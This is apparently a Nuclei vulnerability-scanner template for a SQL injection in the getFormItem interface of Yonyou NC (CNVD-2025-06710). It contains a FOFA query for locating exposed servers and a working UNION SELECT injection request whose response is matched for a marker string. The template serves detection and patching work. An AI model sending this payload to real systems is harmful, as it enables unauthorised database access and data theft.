id: yongyouNC-getFormItem-sql-CNVD-2025-06710

info:
  name: 用友NC getFormItem SQL注入漏洞(CNVD-2025-06710)
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC getFormItem 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/M-9idKN2YzLx25AnRlZRRA
  tags: sql injection

http:
  - raw:
      - |
        GET /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%7C%7CCHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%2888%29%7C%7CCHR%2879%29%7C%7CCHR%2869%29%7C%7CCHR%28107%29%7C%7CCHR%2881%29%7C%7CCHR%2883%29%7C%7CCHR%2880%29%7C%7CCHR%2866%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%7C%7CCHR%2876%29%7C%7CCHR%28104%29%7C%7CCHR%28102%29%7C%7CCHR%2874%29%7C%7CCHR%2898%29%7C%7CCHR%28108%29%7C%7CCHR%28108%29%7C%7CCHR%28108%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%2871%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%2866%29%7C%7CCHR%2877%29%7C%7CCHR%28116%29%7C%7CCHR%28108%29%7C%7CCHR%2865%29%7C%7CCHR%28104%29%7C%7CCHR%2866%29%7C%7CCHR%28110%29%7C%7CCHR%28120%29%7C%7CCHR%2866%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL+FROM+DUAL--+VptC HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qkkkqDeucXOEkQSPBrtLhfJbllljkGxxzBMtlAhBnxBXvqpqkq'
      - type: status
        status: 
          - 500